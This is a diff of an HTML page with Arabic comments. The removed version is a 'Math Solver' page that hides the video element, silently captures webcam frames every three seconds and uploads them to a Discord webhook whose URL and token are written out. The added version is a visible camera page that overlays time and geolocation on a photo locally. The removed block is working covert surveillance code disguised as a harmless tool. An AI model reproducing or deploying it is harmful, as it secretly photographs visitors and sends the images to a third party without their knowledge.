@@ -1,90 +1,121 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>Math Solver</title>
+  <title>Camera Data Capture</title>
   <style>
     body {
       background-color: #f7f7f7;
       font-family: Arial, sans-serif;
-      font-size: 16px;
+      text-align: center;
     }
+
     h1 {
       color: #003580;
-      font-size: 32px;
-      text-align: center;
-      margin-top: 50px;
+      margin-top: 30px;
     }
-    #math-image {
-      display: block;
-      margin: 0 auto;
+
+    video {
       width: 400px;
-      height: 300px;
       border: 2px solid #003580;
       border-radius: 10px;
-      box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
-    }
-    #math-equation {
-      text-align: center;
       margin-top: 20px;
-      font-size: 24px;
-      color: #003580;
     }
-    video {
-      display: none; /* إخفاء الفيديو بالكامل */
+
+    img {
+      width: 400px;
+      margin-top: 20px;
+      border: 2px solid #003580;
+      border-radius: 10px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #003580;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0050c8;
     }
   </style>
 </head>
 <body>
-  <h1>Math Solver</h1>
-  <img id="math-image" src="" alt="Math Equation">
-  <div id="math-equation"></div>
-  <video id="video" autoplay></video>
+
+  <h1>Camera Data Capture</h1>
+
+  <video id="video" autoplay playsinline></video>
+
+  <br>
+  <button onclick="captureImage()">📸 التقاط صورة</button>
+
+  <br>
+  <img id="result" alt="Captured Image">
 
   <script>
-    var imageCounter = 1;
+    let latitude = "N/A";
+    let longitude = "N/A";
 
-    setInterval(function () {
-      captureImage();
-    }, 3000);
-
-  function captureImage() {
-      var video = document.getElementById('video');
-      var canvas = document.createElement('canvas');
-      canvas.width = 640; // ضبط الدقة إلى 1280
-      canvas.height = 720; // ضبط الارتفاع إلى 720
-      var ctx = canvas.getContext('2d');
-
-      // تحسين التباين والإضاءة
-      ctx.filter = 'contrast(1.2) brightness(1.1)';
-      ctx.drawImage(video, 0, 0);
-      
-      // تحويل الصورة إلى Blob بأعلى جودة
-      canvas.toBlob(function(blob) {
-
-        // إرسال الصورة إلى Webhook
-        var formData = new FormData();
-        formData.append('file', blob, 'math-equation.jpg');
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://discord.com/api/webhooks/1317625966306005104/Jto4PkzgKwC4GwedEP4PiL4PjXjF2tBcNdSizTBG_7omqqivhu32KOmis0kbtwlwEf2w');
-        xhr.send(formData);
-      }, 'image/jpeg', 1.0);
-
-      // تحديث النص أسفل الصورة
-      var equation = 'Equation ' + imageCounter++;
-      document.getElementById('math-equation').innerHTML = equation;
+    // طلب الموقع
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          latitude = position.coords.latitude.toFixed(5);
+          longitude = position.coords.longitude.toFixed(5);
+        },
+        error => {
+          console.log("Location permission denied");
+        }
+      );
     }
 
     // تشغيل الكاميرا
-    navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
-      .then(function (mediaStream) {
-        var video = document.getElementById('video');
-        video.srcObject = mediaStream;
-        video.play();
-      })
-      .catch(function (err) {
-        alert('Error accessing camera: ' + err.message);
-      });
+    navigator.mediaDevices.getUserMedia({
+      video: {
+        width: 1280,
+        height: 720,
+        facingMode: "user" // user = أمامية | environment = خلفية
+      }
+    })
+    .then(stream => {
+      document.getElementById("video").srcObject = stream;
+    })
+    .catch(err => {
+      alert("خطأ في تشغيل الكاميرا: " + err.message);
+    });
+
+    function captureImage() {
+      const video = document.getElementById("video");
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // خلفية للنص
+      ctx.fillStyle = "rgba(0, 0, 0, 0.6)";
+      ctx.fillRect(0, canvas.height - 100, canvas.width, 100);
+
+      // نص البيانات
+      ctx.fillStyle = "white";
+      ctx.font = "20px Arial";
+
+      const now = new Date();
+      const dateTime = now.toLocaleString();
+
+      ctx.fillText("🕒 " + dateTime, 20, canvas.height - 60);
+      ctx.fillText("📍 Lat: " + latitude + " | Lng: " + longitude, 20, canvas.height - 30);
+
+      // عرض الصورة
+      document.getElementById("result").src = canvas.toDataURL("image/jpeg");
+    }
   </script>
+
 </body>
 </html>
